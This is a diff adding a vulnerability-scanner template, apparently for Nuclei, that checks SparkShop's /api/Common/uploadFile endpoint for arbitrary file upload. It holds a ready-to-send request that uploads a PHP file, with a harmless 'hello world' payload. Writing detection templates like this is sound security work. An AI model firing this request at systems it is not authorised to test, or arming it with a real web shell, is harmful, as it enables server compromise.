@@ -1,0 +1,35 @@
+id: SparkShop-uploadFile-upload
+
+info:
+  name: SparkShop开源商城 uploadFile 任意文件上传漏洞
+  author: SparkShop
+  severity: high
+  tags: SparkShop
+
+
+http:
+  - raw:
+      - |
+        POST /api/Common/uploadFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
+      
+        ------WebKitFormBoundaryj7OlOPiiukkdktZR
+        Content-Disposition: form-data; name="file"; filename="1.php"
+      
+        <?php echo "hello world";?>
+        ------WebKitFormBoundaryj7OlOPiiukkdktZR--
+  
+    max-redirects: 3
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "upload success"
+          - ".php"
+          - "url"
+        condition: and
